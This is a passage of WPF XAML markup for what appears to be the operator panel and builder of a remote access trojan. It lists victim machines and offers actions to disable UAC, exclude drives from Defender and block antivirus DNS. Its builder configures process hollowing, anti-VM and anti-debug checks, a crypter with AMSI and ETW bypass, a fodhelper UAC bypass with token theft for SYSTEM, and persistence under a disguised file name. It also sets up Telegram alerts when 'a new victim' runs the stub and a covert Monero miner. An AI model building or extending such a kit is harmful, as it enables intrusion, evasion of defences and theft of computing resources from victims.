                                            <MenuItem Header="Performance Monitor" Click="PerformanceMonitor_Click">  <MenuItem.Icon><TextBlock Text="&#x25B3;" FontSize="11" Foreground="#22C55E"/></MenuItem.Icon></MenuItem>
                                        </MenuItem>
                                        <!-- Miscellaneous -->
                                        <MenuItem Header="Miscellaneous">
                                            <MenuItem.Icon><TextBlock Text="&#x2026;" FontSize="13" Foreground="#606880"/></MenuItem.Icon>
                                            <MenuItem Header="Exclude C:\ (Defender)" Click="QuickExcludeCDrive_Click"><MenuItem.Icon><TextBlock Text="&#x25D6;" FontSize="11" Foreground="#a6e3a1"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="Block AV DNS"        Click="QuickBlockAvDns_Click">     <MenuItem.Icon><TextBlock Text="&#x2296;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="Block WSReset"       Click="QuickBlockReset_Click">     <MenuItem.Icon><TextBlock Text="&#x2298;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="Disable UAC"         Click="QuickDisableUac_Click" ToolTip="EnableLUA=0 (admin required, takes effect after reboot)"><MenuItem.Icon><TextBlock Text="&#x26A0;" FontSize="11" Foreground="#f9e2af"/></MenuItem.Icon></MenuItem>
                                            <Separator/>
                                            <MenuItem Header="Run BotKiller"       Click="BotKiller_Click" ToolTip="Kill unsigned random-name processes"><MenuItem.Icon><TextBlock Text="&#x2620;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
                                        </MenuItem>
                                        <!-- Fun -->
                                        <MenuItem Header="Fun">
                                            <MenuItem.Icon><TextBlock Text="&#x25CB;" FontSize="11" Foreground="#f9e2af"/></MenuItem.Icon>
                                            <MenuItem Header="Fun Panel"   Click="Fun_Click">       <MenuItem.Icon><TextBlock Text="&#x25CE;" FontSize="11" Foreground="#f9e2af"/></MenuItem.Icon></MenuItem>
                                            <Separator/>
                                            <MenuItem Header="TikTok Bot"  Click="TikTok_Click">    <MenuItem.Icon><TextBlock Text="&#x266A;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
                                        </MenuItem>
                                        <Separator />
                                        <!-- Client Management -->
                                        <MenuItem Header="Client Management">
                                            <MenuItem.Icon><TextBlock Text="&#x25A3;" FontSize="11" Foreground="#606880"/></MenuItem.Icon>
                                            <MenuItem Header="UAC Elevation"       Click="RequestElevation_Click">      <MenuItem.Icon><TextBlock Text="&#x25B2;" FontSize="10" Foreground="#f9e2af"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="Loop UAC"            Click="RequestElevationLoop_Click">  <MenuItem.Icon><TextBlock Text="&#x21BA;" FontSize="13" Foreground="#f9e2af"/></MenuItem.Icon></MenuItem>
                                            <Separator/>
                                            <MenuItem Header="Update Client"       Click="UpdateClient_Click">          <MenuItem.Icon><TextBlock Text="&#x27F3;" FontSize="13" Foreground="#a6e3a1"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="Disconnect"          Click="DisconnectClient_Click">      <MenuItem.Icon><TextBlock Text="&#x23CF;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="Uninstall Client"    Click="UninstallClient_Click">       <MenuItem.Icon><TextBlock Text="&#x2715;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
                                            <Separator/>
                                            <MenuItem Header="Set Tag"             Click="SetTag_Click">                <MenuItem.Icon><TextBlock Text="&#x25C6;" FontSize="10" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="View Logs"           Click="ViewClientLogs_Click">        <MenuItem.Icon><TextBlock Text="&#x2261;" FontSize="13" Foreground="#cba6f7"/></MenuItem.Icon></MenuItem>
                                            <MenuItem Header="Copy IP"             Click="CopyIP_Click">                <MenuItem.Icon><TextBlock Text="&#x2299;" FontSize="12" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
                                        </MenuItem>
                                    </ContextMenu>
                                </DataGrid.ContextMenu>
                            </DataGrid>

                            <!-- Empty state overlay for Online -->
                            <Grid Grid.Row="1" IsHitTestVisible="False">
                                <Grid.Style>
                                    <Style TargetType="Grid">
                                        <Setter Property="Visibility" Value="Collapsed"/>
                                        <Style.Triggers>
                                            <DataTrigger Binding="{Binding Items.Count, ElementName=GridClients}" Value="0">
                                                <Setter Property="Visibility" Value="Visible"/>
                                            </DataTrigger>
                                        </Style.Triggers>
                                    </Style>
                                </Grid.Style>
                                <StackPanel HorizontalAlignment="Center" VerticalAlignment="Center" Opacity="0.4">
                                    <TextBlock Text="⊘" FontSize="40" Foreground="#606880" HorizontalAlignment="Center"/>
                                    <TextBlock Text="No clients connected" Foreground="#606880" FontSize="13"
                                               HorizontalAlignment="Center" Margin="0,8,0,0"/>
                                </StackPanel>
                            </Grid>
                        </Grid>
                    </Border>
                </TabItem>

                <!-- ── All Clients ── -->
                <TabItem>
                    <TabItem.Header>
                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                            <TextBlock Text="≡" Foreground="#606880" FontSize="13" Margin="0,0,5,0" VerticalAlignment="Center"/>
                            <TextBlock Text="All Clients"/>
                        </StackPanel>
                    </TabItem.Header>
                    <Border Margin="8" CornerRadius="8"
                            Background="#D0111222" BorderThickness="1">
                        <Border.BorderBrush>
                            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                <GradientStop Color="#283040FF" Offset="0"/>
                                <GradientStop Color="#121E2038" Offset="1"/>
                            </LinearGradientBrush>
                        </Border.BorderBrush>
                        <Grid>
                            <DataGrid x:Name="GridAllClients"
                                      AutoGenerateColumns="False" IsReadOnly="True"
                                      Background="Transparent" Foreground="#DDE0F0"
                                      BorderThickness="0" RowBackground="Transparent"
                                      AlternatingRowBackground="#07101428"
                                      GridLinesVisibility="None" HeadersVisibility="Column"
                                      FontSize="12" SelectionMode="Extended" CanUserAddRows="False"
                                      VirtualizingStackPanel.IsVirtualizing="True"
                                      VirtualizingStackPanel.VirtualizationMode="Recycling"
                                      ScrollViewer.CanContentScroll="True"
                                      ScrollViewer.HorizontalScrollBarVisibility="Auto"
                                      ColumnHeaderStyle="{StaticResource SColHeader}">
                                <DataGrid.Columns>
                                    <DataGridTextColumn Header="TAG"       Binding="{Binding Tag}"                                          Width="80"  />
                                    <DataGridTextColumn Header="USER"      Binding="{Binding LastUsername}"                                 Width="110" />
                                    <DataGridTextColumn Header="IP"        Binding="{Binding LastIP}"                                       Width="110" FontFamily="Consolas" FontSize="11"/>
                                    <DataGridTextColumn Header="COUNTRY"   Binding="{Binding LastCountry}"                                  Width="110" />
                                    <DataGridTextColumn Header="MACHINE"   Binding="{Binding LastMachineName}"                              Width="120" />
                                    <DataGridTextColumn Header="OS"        Binding="{Binding LastOS}"                                       Width="115" />
                                    <DataGridTextColumn Header="AV"        Binding="{Binding LastAntivirus}"                                Width="100" FontSize="11"/>
                                    <DataGridTextColumn Header="CPU"       Binding="{Binding LastCpuName}"                                  Width="120" FontSize="11"/>
                                    <DataGridTextColumn Header="GPU"       Binding="{Binding LastGpuName}"                                  Width="120" FontSize="11"/>
                                    <DataGridTextColumn Header="PAYLOAD"   Binding="{Binding LastPayload}"                                  Width="90"  FontSize="11"/>
                                    <DataGridTextColumn Header="RAM"        Binding="{Binding LastRamDisplay}"                               Width="105" FontFamily="Consolas" FontSize="11"/>
                                    <DataGridTextColumn Header="FIRST SEEN" Binding="{Binding FirstSeen, StringFormat=yyyy-MM-dd HH:mm}"   Width="118" FontFamily="Consolas" FontSize="11"/>
                                    <DataGridTextColumn Header="LAST SEEN"  Binding="{Binding LastSeen,  StringFormat=yyyy-MM-dd HH:mm}"   Width="*"   FontFamily="Consolas" FontSize="11"/>
                                </DataGrid.Columns>
                                <DataGrid.ContextMenu>
                                    <ContextMenu>
                                        <MenuItem Header="Set Tag"    Click="SetTagRecord_Click" />
                                        <MenuItem Header="View Logs"  Click="ViewRecordLogs_Click" />
                                        <Separator />
                                        <MenuItem Header="Copy HWID"  Click="CopyRecordHwid_Click" />
                                    </ContextMenu>
                                </DataGrid.ContextMenu>
                            </DataGrid>

                            <!-- Empty state overlay for All Clients -->
                            <Grid IsHitTestVisible="False">
                                <Grid.Style>
                                    <Style TargetType="Grid">
                                        <Setter Property="Visibility" Value="Collapsed"/>
                                        <Style.Triggers>
                                            <DataTrigger Binding="{Binding Items.Count, ElementName=GridAllClients}" Value="0">
                                                <Setter Property="Visibility" Value="Visible"/>
                                            </DataTrigger>
                                        </Style.Triggers>
                                    </Style>
                                </Grid.Style>
                                <StackPanel HorizontalAlignment="Center" VerticalAlignment="Center" Opacity="0.4">
                                    <TextBlock Text="⊘" FontSize="40" Foreground="#606880" HorizontalAlignment="Center"/>
                                    <TextBlock Text="No records found" Foreground="#606880" FontSize="13"
                                               HorizontalAlignment="Center" Margin="0,8,0,0"/>
                                </StackPanel>
                            </Grid>
                        </Grid>
                    </Border>
                </TabItem>

                <!-- ── Builder ── -->
                <TabItem>
                    <TabItem.Header>
                        <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                            <TextBlock Text="⬧" Foreground="#7C5CE8" FontSize="11" Margin="0,0,5,0" VerticalAlignment="Center"/>
                            <TextBlock Text="Builder"/>
                        </StackPanel>
                    </TabItem.Header>
                    <Border Margin="8" Padding="14" CornerRadius="8"
                            Background="#D0111222" BorderThickness="1">
                        <Border.BorderBrush>
                            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                                <GradientStop Color="#283040FF" Offset="0"/>
                                <GradientStop Color="#121E2038" Offset="1"/>
                            </LinearGradientBrush>
                        </Border.BorderBrush>
                        <Grid>
                            <Grid.RowDefinitions>
                                <RowDefinition Height="Auto"/>
                                <RowDefinition Height="*"/>
                            </Grid.RowDefinitions>

                            <!-- ── Page selector ── -->
                            <StackPanel Grid.Row="0" Orientation="Horizontal" Margin="0,0,0,10">
                                <Button x:Name="BtnPageRat" Width="140" Height="28"
                                        Style="{StaticResource SBtn}" Click="BtnPageRat_Click">
                                    <StackPanel Orientation="Horizontal">
                                        <TextBlock Text="🐀" Foreground="#7C5CE8" FontSize="11" Margin="0,0,6,0" VerticalAlignment="Center"/>
                                        <TextBlock Text="RAT BUILDER" VerticalAlignment="Center"/>
                                    </StackPanel>
                                </Button>
                                <Button x:Name="BtnPageXmr" Width="140" Height="28" Margin="8,0,0,0"
                                        Style="{StaticResource SBtn}" Click="BtnPageXmr_Click" Opacity="0.55">
                                    <StackPanel Orientation="Horizontal">
                                        <TextBlock Text="⛏" Foreground="#F59E0B" FontSize="11" Margin="0,0,6,0" VerticalAlignment="Center"/>
                                        <TextBlock Text="XMR MINER" VerticalAlignment="Center"/>
                                    </StackPanel>
                                </Button>
                            </StackPanel>

                            <!-- ── RAT page ── -->
                            <ScrollViewer x:Name="PageRat" Grid.Row="1" VerticalScrollBarVisibility="Auto" HorizontalScrollBarVisibility="Disabled">
                            <Grid x:Name="BuilderPanel">
                                <Grid.ColumnDefinitions>
                                    <ColumnDefinition Width="*"/>
                                    <ColumnDefinition Width="8"/>
                                    <ColumnDefinition Width="*"/>
                                </Grid.ColumnDefinitions>
                                <StackPanel Grid.Column="0" VerticalAlignment="Top">

                                <!-- CONNECTION card -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="CONNECTION" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <TextBlock Text="HOSTS" Style="{StaticResource SFieldLabel}" />
                                        <ListBox x:Name="BldHosts" Style="{StaticResource SListBox}" Height="52" Margin="0,0,0,5" />
                                        <Grid Margin="0,0,0,14">
                                            <Grid.ColumnDefinitions>
                                                <ColumnDefinition Width="*" />
                                                <ColumnDefinition Width="Auto" />
                                                <ColumnDefinition Width="Auto" />
                                            </Grid.ColumnDefinitions>
                                            <TextBox x:Name="BldHostInput" Style="{StaticResource STxt}" />
                                            <Button Grid.Column="1" Content="+" Width="44" Margin="6,0,0,0" Style="{StaticResource SBtn}" Click="BldAddHost_Click" />
                                            <Button Grid.Column="2" Content="−" Width="44" Margin="4,0,0,0" Style="{StaticResource SBtn}" Click="BldDelHost_Click" />
                                        </Grid>
                                        <TextBlock Text="PORT" Style="{StaticResource SFieldLabel}" />
                                        <TextBox x:Name="BldPort" Style="{StaticResource STxt}" Text="7777" Margin="0,0,0,8" />
                                        <CheckBox x:Name="BldUsePastebin" Content="Use Pastebin (disables direct connection)" Style="{StaticResource SChk}" IsChecked="False" Checked="BldUsePastebin_Checked" Unchecked="BldUsePastebin_Unchecked" Margin="0,0,0,6" />
                                        <TextBlock Text="PASTEBIN URL" Style="{StaticResource SFieldLabel}" />
                                        <TextBox x:Name="BldPastebinUrl" Style="{StaticResource STxt}" Text="https://pastebin.com/raw/YourURL" IsEnabled="False" />
                                    </StackPanel>
                                </Border>

                                <!-- IDENTITY card -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="IDENTITY" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <TextBlock Text="CLIENT ID PREFIX" Style="{StaticResource SFieldLabel}" />
                                        <TextBox x:Name="BldClientIdPrefix" Style="{StaticResource STxt}" Margin="0,0,0,14" />
                                        <CheckBox x:Name="BldSetAssembly" Content="Copy assembly metadata from executable" Style="{StaticResource SChk}" Checked="BldSetAssembly_Checked" Unchecked="BldSetAssembly_Unchecked" />
                                        <TextBlock x:Name="BldAssemblyPath" Text="No executable selected" Foreground="#7880A8" Margin="0,0,0,12" FontSize="11" />
                                        <CheckBox x:Name="BldSetIcon" Content="Set custom icon from .ico file" Style="{StaticResource SChk}" Checked="BldSetIcon_Checked" Unchecked="BldSetIcon_Unchecked" />
                                        <TextBlock x:Name="BldIconPath" Text="No icon selected" Foreground="#7880A8" Margin="0,0,0,12" FontSize="11" />
                                        <CheckBox x:Name="BldUseMutex" Content="Use Mutex" Style="{StaticResource SChk}" IsChecked="True" />
                                        <TextBlock Text="MUTEX" Style="{StaticResource SFieldLabel}" Margin="0,4,0,4" />
                                        <Grid>
                                            <Grid.ColumnDefinitions>
                                                <ColumnDefinition Width="*" />
                                                <ColumnDefinition Width="Auto" />
                                            </Grid.ColumnDefinitions>
                                            <TextBox x:Name="BldMutex" Style="{StaticResource STxt}"
                                                     Text="Global\{B7E9F3A1-4D2C-4A8E-9F1B-3C5D7E2A6B8F}" />
                                            <Button Grid.Column="1" Content="GEN" Width="60" Margin="6,0,0,0"
                                                    Style="{StaticResource SBtn}" Click="BldGenMutex_Click" />
                                        </Grid>
                                    </StackPanel>
                                </Border>
                                    </StackPanel>
                                    <StackPanel Grid.Column="2" VerticalAlignment="Top">

                                <!-- PROCESS HOLLOWING card -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="PROCESS HOLLOWING" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <CheckBox x:Name="BldHollowing" Content="Auto-inject into legitimate process" Style="{StaticResource SChk}" />
                                        <StackPanel Margin="0,4,0,0"
                                                    Visibility="{Binding IsChecked, ElementName=BldHollowing, Converter={StaticResource BoolToVis}}">
                                            <TextBlock Text="TARGET PROCESS" Style="{StaticResource SFieldLabel}" />
                                            <ComboBox x:Name="BldHollowTarget" MaxDropDownHeight="460"
                                                      IsEditable="True" Text=""
                                                      FontFamily="Consolas" FontSize="11"
                                                      Background="White" Foreground="#111111"
                                                      BorderBrush="#1E2038" BorderThickness="1">
                                                <ComboBox.Resources>
                                                    <SolidColorBrush x:Key="{x:Static SystemColors.WindowBrushKey}"          Color="White"/>
                                                    <SolidColorBrush x:Key="{x:Static SystemColors.WindowTextBrushKey}"      Color="#111111"/>
                                                    <SolidColorBrush x:Key="{x:Static SystemColors.HighlightBrushKey}"       Color="#E0E8FF"/>
                                                    <SolidColorBrush x:Key="{x:Static SystemColors.HighlightTextBrushKey}"   Color="#111111"/>
                                                    <SolidColorBrush x:Key="{x:Static SystemColors.ControlBrushKey}"         Color="White"/>
                                                </ComboBox.Resources>
                                                <ComboBox.ItemContainerStyle>
                                                    <Style TargetType="ComboBoxItem">
                                                        <Setter Property="Background" Value="White"/>
                                                        <Setter Property="Foreground" Value="#111111"/>
                                                        <Setter Property="Padding"    Value="6,5"/>
                                                        <Setter Property="Template">
                                                            <Setter.Value>
                                                                <ControlTemplate TargetType="ComboBoxItem">
                                                                    <Border x:Name="bd" Background="{TemplateBinding Background}"
                                                                            Padding="{TemplateBinding Padding}">
                                                                        <ContentPresenter/>
                                                                    </Border>
                                                                    <ControlTemplate.Triggers>
                                                                        <Trigger Property="IsHighlighted" Value="True">
                                                                            <Setter TargetName="bd" Property="Background" Value="#E0E8FF"/>
                                                                        </Trigger>
                                                                        <Trigger Property="IsSelected" Value="True">
                                                                            <Setter TargetName="bd" Property="Background" Value="#C8D8FF"/>
                                                                        </Trigger>
                                                                    </ControlTemplate.Triggers>
                                                                </ControlTemplate>
                                                            </Setter.Value>
                                                        </Setter>
                                                    </Style>
                                                </ComboBox.ItemContainerStyle>
                                                <ComboBox.ItemTemplate>
                                                    <DataTemplate>
                                                        <Grid MinWidth="360">
                                                            <Grid.ColumnDefinitions>
                                                                <ColumnDefinition Width="180" />
                                                                <ColumnDefinition Width="50" />
                                                                <ColumnDefinition Width="*" />
                                                            </Grid.ColumnDefinitions>
                                                            <TextBlock Grid.Column="0" Text="{Binding Proc}" FontWeight="SemiBold"
                                                                       Foreground="#111111" FontFamily="Consolas" FontSize="11" VerticalAlignment="Center" />
                                                            <TextBlock Grid.Column="1" Text="{Binding Score}" Foreground="{Binding ScoreColor}"
                                                                       FontWeight="Bold" FontFamily="Consolas" FontSize="11" VerticalAlignment="Center" />
                                                            <TextBlock Grid.Column="2" Text="{Binding Note}" Foreground="#667088"
                                                                       FontFamily="Consolas" FontSize="10" VerticalAlignment="Center" />
                                                        </Grid>
                                                    </DataTemplate>
                                                </ComboBox.ItemTemplate>
                                            </ComboBox>
                                        </StackPanel>
                                    </StackPanel>
                                </Border>

                                <!-- PROTECTION card -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="PROTECTION" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <CheckBox x:Name="BldAntiDebug"   Content="Anti-Debug"                                     Style="{StaticResource SChk}" IsChecked="True" />
                                        <CheckBox x:Name="BldAntiVM"      Content="Anti-VM"                                        Style="{StaticResource SChk}" IsChecked="True" />
                                        <CheckBox x:Name="BldAntiDetect"  Content="Anti-Detect (analysis tools)"                   Style="{StaticResource SChk}" IsChecked="True" />
                                        <CheckBox x:Name="BldAntiSandbox" Content="Anti-Sandbox"                                   Style="{StaticResource SChk}" IsChecked="True" />
                                        <CheckBox x:Name="BldAntiKill"    Content="Anti-Kill"                                      Style="{StaticResource SChk}" IsChecked="False"
                                                  ToolTip="DACL (deny TERMINATE) + guardian + WMI persistence. Redémarre le process s'il est tué."
                                                  Checked="BldPersist_Changed" Unchecked="BldPersist_Changed" />
                                        <TextBlock x:Name="TxtMaxPersist" Margin="18,2,0,0" FontSize="10"
                                                   Foreground="#22C55E" FontWeight="SemiBold"
                                                   Text="✓ Persistance maximale" Visibility="Collapsed" />
                                    </StackPanel>
                                </Border>

                                <!-- OBFUSCATION card -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="OBFUSCATION" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <CheckBox x:Name="BldEncrypt"   Content="Crypter (AES-256, polymorphic, AMSI+ETW bypass) — closed-source"  Style="{StaticResource SChk}" />
                                        <CheckBox x:Name="BldUacBypass" Content="UAC Bypass + SYSTEM elevation (fodhelper chain) — closed-source" Style="{StaticResource SChk}"
                                                  ToolTip="① fodhelper UAC bypass (ms-settings HKCU hijack). ② SeDebugPrivilege + vol de token winlogon.exe pour SYSTEM." />
                                        <Border Margin="18,2,0,0" Padding="8,5"
                                                Background="#1AF59E0B" BorderBrush="#60F59E0B"
                                                BorderThickness="1" CornerRadius="5"
                                                Visibility="{Binding IsChecked, ElementName=BldUacBypass, Converter={StaticResource BoolToVis}}">
                                            <TextBlock FontSize="10" Foreground="#F59E0B" TextWrapping="Wrap"
                                                       Text="⚠  UAC bypass utilise le loader natif C++ — le crypter sera appliqué automatiquement." />
                                        </Border>
                                    </StackPanel>
                                </Border>

                                <!-- PERSISTENCE card -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="PERSISTENCE" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <CheckBox x:Name="BldPersistRegistry" Content="Registry (HKCU\Run)"  Style="{StaticResource SChk}" Checked="BldPersist_Changed" Unchecked="BldPersist_Changed" />
                                        <CheckBox x:Name="BldPersistStartup"  Content="Startup Folder"       Style="{StaticResource SChk}" Checked="BldPersist_Changed" Unchecked="BldPersist_Changed" />
                                        <CheckBox x:Name="BldPersistTask"     Content="Scheduled Task"        Style="{StaticResource SChk}" IsChecked="True" Checked="BldPersist_Changed" Unchecked="BldPersist_Changed" />
                                        <StackPanel x:Name="BldInstallPanel">
                                            <StackPanel Orientation="Horizontal" Margin="0,4,0,4">
                                                <TextBlock Text="Install folder: " Foreground="#606880" FontSize="12" VerticalAlignment="Center" Width="90" />
                                                <TextBox x:Name="BldInstallFolder" Style="{StaticResource STxt}" Width="160" Text="Windows" />
                                            </StackPanel>
                                            <StackPanel Orientation="Horizontal" Margin="0,0,0,4">
                                                <TextBlock Text="File name:      " Foreground="#606880" FontSize="12" VerticalAlignment="Center" Width="90" />
                                                <TextBox x:Name="BldInstallFileName" Style="{StaticResource STxt}" Width="160" Text="windows.exe" />
                                            </StackPanel>
                                        </StackPanel>
                                        <TextBox x:Name="BldAuthKey"  Visibility="Collapsed" />
                                        <TextBox x:Name="BldCertHash" Visibility="Collapsed" />
                                    </StackPanel>
                                </Border>

                                <!-- NOTIFICATIONS card (Telegram) -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="NOTIFICATIONS" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <CheckBox x:Name="BldTelegramEnabled"
                                                  Content="Telegram — notify on first execution"
                                                  Style="{StaticResource SChk}"
                                                  ToolTip="Sends a message when a new victim runs the stub for the first time (client ID, IP, CPU, OS, admin status)."/>
                                        <StackPanel Margin="0,6,0,0"
                                                    Visibility="{Binding IsChecked, ElementName=BldTelegramEnabled, Converter={StaticResource BoolToVis}}">
                                            <TextBlock Text="BOT TOKEN" Style="{StaticResource SFieldLabel}"/>
                                            <TextBox x:Name="BldTelegramToken" Style="{StaticResource STxt}"
                                                     Margin="0,0,0,6"
                                                     ToolTip="Get from @BotFather — format: 123456789:ABCdef…"/>
                                            <Grid Margin="0,0,0,0">
                                                <Grid.ColumnDefinitions>
                                                    <ColumnDefinition Width="*"/>
                                                    <ColumnDefinition Width="8"/>
                                                    <ColumnDefinition Width="*"/>
                                                </Grid.ColumnDefinitions>
                                                <StackPanel>
                                                    <TextBlock Text="CHAT ID 1" Style="{StaticResource SFieldLabel}"/>
                                                    <TextBox x:Name="BldTelegramChatId1" Style="{StaticResource STxt}"
                                                             ToolTip="Your Telegram numeric user/chat ID"/>
                                                </StackPanel>
                                                <StackPanel Grid.Column="2">
                                                    <TextBlock Text="CHAT ID 2 (opt.)" Style="{StaticResource SFieldLabel}"/>
                                                    <TextBox x:Name="BldTelegramChatId2" Style="{StaticResource STxt}"
                                                             ToolTip="Second recipient (optional — leave blank to skip)"/>
                                                </StackPanel>
                                            </Grid>
                                            <StackPanel Orientation="Horizontal" Margin="0,6,0,0">
                                                <Button x:Name="BtnTelegramTest" Content="TEST"
                                                        Width="70" Height="30"
                                                        Style="{StaticResource SBtn}"
                                                        Click="BtnTelegramTest_Click"
                                                        FontSize="10" FontWeight="SemiBold"/>
                                                <TextBlock x:Name="TxtTelegramTestResult" Text=""
                                                           FontSize="10" FontFamily="Consolas"
                                                           VerticalAlignment="Center" Margin="10,0,0,0"/>
                                            </StackPanel>
                                        </StackPanel>
                                    </StackPanel>
                                </Border>

                                <!-- RECONNECT + BUILD card -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="RECONNECT" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C07C5CE8" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <StackPanel Orientation="Horizontal" Margin="0,0,0,16">
                                            <TextBlock Text="Delay (ms):" Foreground="#606880" FontSize="12" VerticalAlignment="Center" Margin="0,0,8,0" />
                                            <TextBox x:Name="BldReconnectDelay" Style="{StaticResource STxt}" Width="70" Text="5000" />
                                        </StackPanel>
                                        <StackPanel Orientation="Horizontal">
                                            <Button x:Name="BtnBuild" Content="BUILD" Width="120" Height="30"
                                                    Style="{StaticResource SGreenBtn}" Click="Build_Click" />
                                            <Button Content="SAVE"      Width="70" Height="30" Margin="8,0,0,0" Style="{StaticResource SBtn}" Click="BldSaveConfig_Click" />
                                            <Button Content="CHECK ALL" Width="96" Height="30" Margin="8,0,0,0" Style="{StaticResource SBtn}" Click="BldCheckAll_Click" />
                                        </StackPanel>
                                        <TextBlock x:Name="TxtBuildStatus" Text="" Foreground="#606880"
                                                   FontSize="11" FontFamily="Consolas" TextWrapping="Wrap" Margin="0,12,0,0" />
                                    </StackPanel>
                                </Border>

                                    </StackPanel>
                            </Grid>
                            </ScrollViewer>

                            <!-- ── XMR page ── -->
                            <ScrollViewer x:Name="PageXmr" Grid.Row="1" Visibility="Collapsed"
                                          VerticalScrollBarVisibility="Auto" HorizontalScrollBarVisibility="Disabled">
                            <Grid>
                                <Grid.ColumnDefinitions>
                                    <ColumnDefinition Width="*"/>
                                    <ColumnDefinition Width="8"/>
                                    <ColumnDefinition Width="*"/>
                                </Grid.ColumnDefinitions>
                                <StackPanel Grid.Column="0" VerticalAlignment="Top">

                                <!-- Binary status -->
                                <Border Margin="0,0,0,12" Padding="8,6" CornerRadius="6"
                                        Background="#0CF59E0B" BorderThickness="1.5" BorderBrush="#50F59E0B">
                                    <StackPanel>
                                        <TextBlock Text="XMRIG BINARY" Foreground="#99F59E0B"
                                                   FontSize="9" FontWeight="Bold" FontFamily="Consolas" Margin="0,0,0,3"/>
                                        <TextBlock x:Name="BldMnrXmrigPath" Text="Searching…"
                                                   Foreground="#7880A8" FontSize="11" TextTrimming="CharacterEllipsis"/>
                                    </StackPanel>
                                </Border>

                                <!-- NETWORK card -->
                                <Border Margin="0,0,0,5" Padding="8,6" CornerRadius="6"
                                        Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                                    <StackPanel>
                                        <TextBlock Text="NETWORK" FontSize="9" FontWeight="Bold"
                                                   Foreground="#C0F59E0B" FontFamily="Consolas" Margin="0,0,0,5"/>
                                        <TextBlock Text="POOL URL" Style="{StaticResource SFieldLabel}"/>
                                        <TextBox x:Name="BldMnrPool" Style="{StaticResource STxt}"
                                                 Text="pool.supportxmr.com:3333" Margin="0,0,0,4"/>
                                        <CheckBox x:Name="BldMnrTls" Content="TLS / SSL" Foreground="#FFCCCCCC"
                                                  FontFamily="Consolas" FontSize="11" Margin="0,0,0,6"/>
                                        <TextBlock Text="WALLET ADDRESS" Style="{StaticResource SFieldLabel}"/>
                                        <TextBox x:Name="BldMnrWallet" Style="{StaticResource STxt}"
                                                 Text="" Margin="0,0,0,6" ToolTip="Your Monero wallet address"/>
                                        <Grid>
                                            <Grid.ColumnDefinitions>
                                                <ColumnDefinition Width="*"/>
                                                <ColumnDefinition Width="8"/>
                                                <ColumnDefinition Width="88"/>
                                            </Grid.ColumnDefinitions>
                                            <StackPanel>
                                                <TextBlock Text="PASSWORD" Style="{StaticResource SFieldLabel}"/>
                                                <TextBox x:Name="BldMnrPass" Style="{StaticResource STxt}" Text="x"/>
                                            </StackPanel>
                                            <StackPanel Grid.Column="2">
                                                <TextBlock Text="ALGO" Style="{StaticResource SFieldLabel}"/>
                                                <TextBox x:Name="BldMnrAlgo" Style="{StaticResource STxt}" Text="rx/0"/>
                                            </StackPanel>
                                        </Grid>
                                        <TextBlock Text="WORKER NAME (optional)" Style="{StaticResource SFieldLabel}" Margin="0,6,0,0"
                                                   ToolTip="Worker label shown in pool stats. Leave blank to use Password field."/>
                                        <TextBox x:Name="BldMnrWorkerName" Style="{StaticResource STxt}" Text=""
                                                 ToolTip="e.g. rig1 — overrides Password field as the pool worker name"/>
                                    </StackPanel>
